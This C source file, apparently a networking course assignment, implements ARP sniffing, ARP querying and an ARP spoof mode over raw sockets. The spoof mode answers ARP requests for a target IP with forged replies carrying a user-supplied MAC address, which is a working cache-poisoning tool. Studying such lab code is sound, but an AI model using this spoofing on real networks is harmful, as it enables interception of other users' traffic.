#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"
#include <netinet/in.h>
#include <netinet/ether.h>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <arpa/inet.h>

/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
#define DEVICE_NAME "enp2s0f5"
#define ETHER_HEADER_LEN sizeof(struct ether_header)
#define ETHER_ARP_LEN sizeof(struct ether_arp)
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
#define IP_ADDR_LEN 4
#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

int main(int argc,char **argv)
{
	int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq req;
	int bufferlen,sentlen;
	
	struct ether_arp *arp_packet_recv;
	char buf1[ETHER_ARP_PACKET_LEN];
	socklen_t sll_len = sizeof(struct sockaddr_ll);
	uid_t uid=getuid();
	if(uid!=0){
		fprintf(stdout,"%s\n","Error : You must be root to use this tool!");
		exit(1);
	}
	else{	
	// Open a recv socket in data-link layer.
		if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
				{
					perror("open recv socket error");
					exit(1);
				}
		fprintf(stdout,"%s\n","[ ARP sniffer and spoof program ]");
		if(strcmp(argv[1],"-help")==0){
			fprintf(stdout,"%s\n%s\n%s\n%s\n%s\n","Format :",
				"1) ./arp -i -a","2) .-arp -i <filter_ip_address>",
				"3) ./arp -q <query_ip_address>","4) ./arp <fake_mac_address> <target_ip_address>");
			exit(0);
		}else if(strcmp(argv[1],"-l")==0){
			fprintf(stdout,"%s\n","### ARP sniffer mode ###");
			if(strcmp(argv[2],"-a")==0){	
				/*
	 			* Use recvfrom function to get packet.
	 			* recvfrom( ... )
	 			*/
				while(1){
					bzero(buf1, ETHER_ARP_PACKET_LEN);
					bufferlen = recvfrom(sockfd_recv,buf1,sizeof(buf1), 0 , (struct sockaddr *) &sa ,&sll_len);  
 					if (bufferlen < 0) { 
 						perror("recvfrom error\n"); 
 						exit(-1); 
 					}
 					arp_packet_recv = (struct ether_arp *)(buf1 + ETHER_HEADER_LEN);
					if(ntohs(arp_packet_recv->arp_op)==1){
                   				printf("Get ARP packet - Who has %s ?\t\t",get_target_protocol_addr(arp_packet_recv));          
                   				printf("Tell %s\n",get_sender_protocol_addr(arp_packet_recv));  
                   			}

				}	
			}else {
				while(1){
					bzero(buf1, ETHER_ARP_PACKET_LEN);
					bufferlen = recvfrom(sockfd_recv,buf1,sizeof(buf1), 0 , (struct sockaddr *) &sa ,&sll_len);  
 					if (bufferlen < 0) { 
 						perror("recvfrom error\n"); 
 						exit(-1); 
 					}
 					arp_packet_recv = (struct ether_arp *)(buf1 + ETHER_HEADER_LEN);
 					if(ntohs(arp_packet_recv->arp_op)==1){
						if(strcmp(get_target_protocol_addr(arp_packet_recv),argv[2])==0){
        	           	    			printf("Get ARP packet - Who has %s ?\t\t",get_target_protocol_addr(arp_packet_recv));	
                   					printf("Tell %s\n",get_sender_protocol_addr(arp_packet_recv));  
                   				}
                   			}
				}
			}
		}
		else if(strcmp(argv[1],"-q")==0){
			fprintf(stdout,"%s\n","### ARP query mode ###");
			// Open a send socket in data-link layer.
			if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
			{
				perror("open send socket error");
				exit(sockfd_send);
			}

			//initialize
			bzero(&sa, sll_len);
    			bzero(&req, sizeof(struct ifreq));
			/*
	 		* Use ioctl function binds the send socket and the Network Interface Card.
`	 		* ioctl( ... )
	 		*/
			char *src_ip; 
			unsigned char src_mac_addr[ETH_ALEN];
			unsigned char dst_mac_addr[ETH_ALEN]=BROADCAST_ADDR;
			unsigned char unknown_mac_addr[ETHER_HEADER_LEN]={0x00,0x00,0x00,0x00,0x00,0x00};
			char buf[ETHER_ARP_PACKET_LEN];
			struct ether_header *eth_header;
			struct ether_arp *arp_packet;
			
			memcpy(req.ifr_name, DEVICE_NAME, sizeof(DEVICE_NAME));
    			if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1) {
        			perror("SIOCGIFINDEX");
        			exit(1);
    			}
    			sa.sll_ifindex = req.ifr_ifindex;
    			//ip
    	 		if (ioctl(sockfd_send, SIOCGIFADDR, &req) == -1){
        			perror("SIOCGIFADDR");
        			exit(1);
    			}
    			src_ip = inet_ntoa(((struct sockaddr_in *)&(req.ifr_addr))->sin_addr);
		
			//mac
			if (ioctl(sockfd_send, SIOCGIFHWADDR, &req)==-1){
        			perror("SIOCGIFHWADDR");
        			exit(1);
    			}
    			memcpy(src_mac_addr, req.ifr_hwaddr.sa_data, ETH_ALEN);
    	
			// Fill the parameters of the sa.
			sa.sll_family = AF_PACKET;
    			sa.sll_protocol = htons(ETH_P_ARP);
    			sa.sll_hatype = htons(ARPHRD_ETHER);
    			sa.sll_pkttype = PACKET_BROADCAST;
    			sa.sll_halen = ETHER_ADDR_LEN;

    			bzero(buf, ETHER_ARP_PACKET_LEN);
    			eth_header = (struct ether_header *)buf;
			memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
			memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
			eth_header->ether_type = htons(ETHERTYPE_ARP);

			arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
			set_hard_type(arp_packet,ARPHRD_ETHER);
			set_prot_type(arp_packet,ETHERTYPE_IP);
			set_hard_size(arp_packet,ETH_ALEN);
			set_prot_size(arp_packet,IP_ADDR_LEN);
			set_op_code(arp_packet,ARPOP_REQUEST);
			set_sender_hardware_addr(arp_packet,src_mac_addr);
			set_sender_protocol_addr(arp_packet,src_ip);
			set_target_hardware_addr(arp_packet,unknown_mac_addr);
			set_target_protocol_addr(arp_packet,argv[2]);
			memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
		
			/*
			 * use sendto function with sa variable to send your packet out
	 		* sendto( ... )
	 		*/
			sentlen = sendto(sockfd_send, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&sa,sizeof(struct sockaddr_ll));
            		if (sentlen == -1)
            		{
                		perror("sendto error");
                		exit(1);
           		 }

            		while(1){
					bzero(buf1, ETHER_ARP_PACKET_LEN);
					bufferlen = recvfrom(sockfd_recv,buf1,sizeof(buf1), 0 , (struct sockaddr *) &sa ,&sll_len);  
 					if (bufferlen < 0) { 
 						perror("recvfrom error\n"); 
 						exit(-1); 
 					}
 					arp_packet_recv = (struct ether_arp *)(buf1 + ETHER_HEADER_LEN);
 					if (ntohs(arp_packet_recv->arp_op) == 2){
						if(strcmp(get_sender_protocol_addr(arp_packet_recv),argv[2])==0){
        	           	    			printf("MAC address of %s is ",get_sender_protocol_addr(arp_packet_recv));
                    					printf("%s",get_sender_hardware_addr(arp_packet_recv));
                					printf("\n");
                					fflush(stdout);
                   				}
                   			}
				}	
			}else {
				fprintf(stdout,"%s\n","### ARP spoof mode ###");
				while(1){
					bzero(buf1, ETHER_ARP_PACKET_LEN);
					bufferlen = recvfrom(sockfd_recv,buf1,sizeof(buf1), 0 , (struct sockaddr *) &sa ,&sll_len);  
 					if (bufferlen < 0) { 
 						perror("recvfrom error\n"); 
 						exit(-1); 
 					}
 					arp_packet_recv = (struct ether_arp *)(buf1 + ETHER_HEADER_LEN);

 					if(strcmp(get_target_protocol_addr(arp_packet_recv),argv[2])==0){ 	
						if (ntohs(arp_packet_recv->arp_op) == 1){
        	           	    			if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
							{
								perror("open send socket error");
								exit(sockfd_send);
							}

							//initialize
							bzero(&sa, sll_len);
    							bzero(&req, sizeof(struct ifreq));

							char recv_src_mac_addr[32];
							char buf[ETHER_ARP_PACKET_LEN];
							struct ether_header *eth_header;
							struct ether_arp *arp_packet;
							struct ether_addr src_ether_addr,dst_ether_addr;
							
							memcpy(req.ifr_name, DEVICE_NAME, sizeof(DEVICE_NAME));
    							if (ioctl(sockfd_send, SIOCGIFINDEX, &req) == -1) {
        							perror("SIOCGIFINDEX");
        							exit(1);
    							}
    							sa.sll_ifindex = req.ifr_ifindex;
    							
    			
							// Fill the parameters of the sa.
							sa.sll_family = AF_PACKET;
    							sa.sll_protocol = htons(ETH_P_ARP);
    							sa.sll_hatype = htons(ARPHRD_ETHER);
    							//sa.sll_pkttype = PACKET_BROADCAST;
    							sa.sll_halen = ETHER_ADDR_LEN;

    							bzero(buf, ETHER_ARP_PACKET_LEN);
    							eth_header = (struct ether_header *)buf;
    							memcpy(recv_src_mac_addr, get_sender_hardware_addr(arp_packet_recv),32);//&
		
    							ether_aton_r(recv_src_mac_addr, &dst_ether_addr);
    							ether_aton_r(argv[1], &src_ether_addr);
							memcpy(eth_header->ether_shost, &src_ether_addr, ETH_ALEN);
							memcpy(eth_header->ether_dhost, &dst_ether_addr, ETH_ALEN);
							eth_header->ether_type = htons(ETHERTYPE_ARP);
							
							arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
							set_hard_type(arp_packet,ARPHRD_ETHER);
							set_prot_type(arp_packet,ETHERTYPE_IP);
							set_hard_size(arp_packet,ETH_ALEN);
							set_prot_size(arp_packet,IP_ADDR_LEN);
							set_op_code(arp_packet,ARPOP_REPLY);
						
							memcpy(arp_packet->arp_sha, &src_ether_addr,6);
							set_sender_protocol_addr(arp_packet,get_target_protocol_addr(arp_packet_recv));
							memcpy(arp_packet->arp_tha, &dst_ether_addr,6);
							set_target_protocol_addr(arp_packet,get_sender_protocol_addr(arp_packet_recv));
							memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
		
							/*
			 				* use sendto function with sa variable to send your packet out
	 						* sendto( ... )
	 						*/
							sentlen = sendto(sockfd_send, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&sa,
														sizeof(struct sockaddr_ll));
            						if (sentlen == -1)
            						{
                						perror("sendto error");
                						exit(1);
           						 }
           						 
           						printf("Get ARP packet - Who has %s ?\t\t",
           							get_target_protocol_addr(arp_packet_recv));          
                   					printf("Tell %s\n",get_sender_protocol_addr(arp_packet_recv));
                   					printf("Send ARP reply : %s\nSend successful\n",get_sender_hardware_addr(arp_packet));
                   					
                   				}
                   			}
				}	
			
			
			
			}
		}
		

	close(sockfd_send);
	close(sockfd_recv);
	
	return 0;
}

